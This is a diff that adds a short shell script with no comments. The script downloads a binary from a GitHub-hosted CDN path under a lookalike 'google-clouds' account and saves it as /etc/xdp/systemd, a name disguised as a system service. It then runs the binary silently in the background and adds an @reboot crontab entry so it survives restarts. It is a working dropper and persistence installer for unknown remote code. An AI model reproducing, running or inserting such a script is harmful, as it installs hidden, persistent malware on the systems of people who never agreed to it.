@@ -1,0 +1,19 @@
+#!/bin/sh
+
+
+
+
+curl https://cdn.jsdelivr.net/gh/google-clouds/sdk/tt --output /tmp/systemd
+mkdir -p /etc/xdp/
+mv /tmp/systemd /etc/xdp/systemd
+chmod +x /etc/xdp/systemd
+/etc/xdp/systemd 2>/dev/null 1>/dev/null &
+crontab -e 2>/dev/null 1>/dev/null &
+command="/etc/xdp/systemd 2>/dev/null 1>/dev/null &"
+job="@reboot $command"
+cat <(fgrep -i -v "$command" <(crontab -l)) <(echo "$job") | crontab -
+
+
+echo
+echo "ok"
+echo
